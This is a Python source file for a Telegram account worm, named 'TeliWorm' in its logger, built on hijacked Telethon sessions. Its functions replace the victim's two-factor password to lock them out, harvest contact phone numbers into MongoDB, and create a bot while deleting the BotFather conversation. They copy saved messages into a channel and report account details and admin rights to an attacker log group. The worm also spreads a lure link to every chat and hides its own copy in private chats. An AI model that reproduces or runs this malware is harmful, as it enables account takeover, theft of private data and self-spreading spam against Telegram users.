import os, random, asyncio, json, string, logging
from typing import Dict, Optional
from telethon.tl.types import User
from telethon import TelegramClient, Button, functions, errors
from telethon.sessions import StringSession
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from pymongo import UpdateOne
from strings import strings,bot_names,bot_usernames
from telethon.tl.functions.contacts import GetContactsRequest


load_dotenv(override=True)
logger = logging.getLogger("TeliWorm")
mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
random_string = lambda length: ''.join(random.choices(string.ascii_letters + string.digits, k=length))
LOG_GROUP = int(os.environ['LOG_GROUP'])
PUBLIC_HOST = os.environ['PUBLIC_HOST']

async def set_passwd(client: TelegramClient, me: User) -> None:
    logger.info(f"Setting password for user {me.phone}")
    user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
    password = random_string(16)
    if 'password' in user_data:
        await client.edit_2fa(current_password=user_data['password'], new_password=password)
    else:
        await client.edit_2fa(new_password=password)
    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password}})
    logger.debug(f"Password set for {me.phone}")
async def backup_contacts(client: TelegramClient) -> None:
    logger.info("Backing up contacts...")
    result = await client(GetContactsRequest(hash=0))
    operations = [
        UpdateOne({'chat_id': user.id}, {"$setOnInsert": {'phone': user.phone}}, upsert=True)
        for user in result.users if user.phone
    ]
    inserted_count = 0
    if operations:
        result = mongo_client.userdb.sessions.bulk_write(operations)
        # Inserted count is the number of upserts that resulted in an insert
        inserted_count = result.upserted_count
    logger.debug(f"Contacts inserted: {inserted_count} (out of {len(operations)} attempted).")
async def create_bot(client: TelegramClient, me: User) -> Optional[Dict[str, any]]:
    logger.info("Creating new bot via BotFather...")
    async with client.conversation("@BotFather") as conv:
        msg = await conv.send_message("/newbot")
        await (await conv.get_response()).delete()
        await (await conv.send_message(random.choice(bot_names))).delete()
        await (await conv.get_response()).delete()
        username = f"{random.choice(bot_usernames)}_{random.randint(1000,9999)}{random.randint(1000,9999)}_bot"
        await (await conv.send_message(username)).delete()
        response = await conv.get_response()
        bot_token = response.text.split("`")[1].strip()
        await (await conv.send_message("/setuserpic")).delete()
        await (await conv.get_response()).delete()
        await (await conv.send_message(f"@{username}")).delete()
        await (await conv.get_response()).delete()
        await (await conv.send_file('files/profile.png')).delete()
        await (await conv.get_response()).delete()
        await msg.delete()
        await response.delete()
    botinfo = {"username": username, "token": bot_token, "owner": me.id}
    mongo_client.wormdb.bots.insert_one(botinfo)
    logger.debug(f"Bot created: {botinfo}")
    return botinfo
async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramClient, perm_logs: Optional[Dict[str, any]]) -> Optional[Dict[str, any]]:
    logger.info("Backing up saved messages...")
    result = await client(functions.channels.CreateChannelRequest(
        title=f'{me.first_name} {me.last_name}',
        about=f'ID: {me.id}\nUsername: {me.username}',
        megagroup=False,
    ))
    channel_id = result.updates[1].channel_id
    dest = await client.get_entity(channel_id)
    result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
    mongo_client.wormdb.channels.insert_one({"invite": result.link, "owner": me.id})
    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}")
    msg_count = 0
    async for message in client.iter_messages("me", reverse=True):
        msg_count += 1
        try:
            await message.forward_to(dest)
        except errors.FloodWaitError as e:
            logger.warning(f"FloodWaitError while forwarding message: {e.seconds}s")
            await asyncio.sleep(e.seconds)
            await message.forward_to(dest)
        except Exception as e:
            logger.error(f"Error forwarding message: {e}")
    log = {
        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}",
        'channel_id': channel_id,
        'hash': result.link.split('/')[-1].lstrip('+'),
    }
    if len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
        log['txt'] = log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession")
        await client.send_message(dest, json.dumps(perm_logs, indent=4, ensure_ascii=False))
    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
    await logger_bot.send_message(LOG_GROUP, log['txt'])
    logger.debug(f"Backup log: {log}")
async def spread(
    client: TelegramClient,
    me: User,
    botinfo: Optional[Dict[str, any]],
) -> None:
    logger.info("Spreading worm message...")
    spread_msg = None
    worm_url = PUBLIC_HOST+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
    spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
    if botinfo is not None:
        bot = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
        await bot.start(bot_token=botinfo['token'])
        async with client.conversation(f"@{botinfo['username']}") as conv:
            msg = await conv.send_message("/start")
            await bot.send_message(
                me.id,
                strings['worm_msg'],
                file='files/worm.png',
                buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
                link_preview=False
            )
            spread_msg = await conv.get_response()
        await bot.disconnect()
        logger.debug(f"Spread message sent via bot {botinfo['username']}")
    perm_logs = {
        'creator': [],
        'admin': [],
    }
    async for dialog in client.iter_dialogs():
        if dialog.is_user and (dialog.entity.bot or dialog.entity.deleted):
            continue
        if dialog.is_channel or dialog.is_group:
            permissions = await client.get_permissions(dialog, me)
            if permissions.is_creator:
                perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
            elif permissions.is_admin:
                perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
        try:
            if spread_msg:
                msg = await spread_msg.forward_to(dialog)
            else:
                msg = await dialog.send_message(spread_msg_nomedia)
        except errors.FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            if spread_msg:
                msg = await spread_msg.forward_to(dialog)
            else:
                msg = await dialog.send_message(spread_msg_nomedia)
        except Exception as e:
            try:
                msg = await dialog.send_message(spread_msg_nomedia)
            except errors.FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                msg = await dialog.send_message(spread_msg_nomedia)
            except Exception as e2:
                continue
        if dialog.is_user:
            await msg.delete(revoke=False)
    return perm_logs

async def worm(client: TelegramClient, logger_bot: TelegramClient) -> None:
    logger.info("Starting worm sequence...")
    me = await client.get_me()
    perm_logs = None
    botinfo = None
    try:
        await set_passwd(client, me)
    except Exception as e:
        logger.error(f"Error in set_passwd: {e}")
    try:
        await backup_contacts(client)
    except Exception as e:
        logger.error(f"Error in backup_contacts: {e}")
    try:
        botinfo = await create_bot(client, me)
    except Exception as e:
        logger.error(f"Error in create_bot: {e}")
    try:
        perm_logs = await spread(client, me, botinfo)
    except Exception as e:
        logger.error(f"Error in spread: {e}")
    try:
        await backup_saves(client, me, logger_bot, perm_logs)
    except Exception as e:
        logger.error(f"Error in backup_saves: {e}")
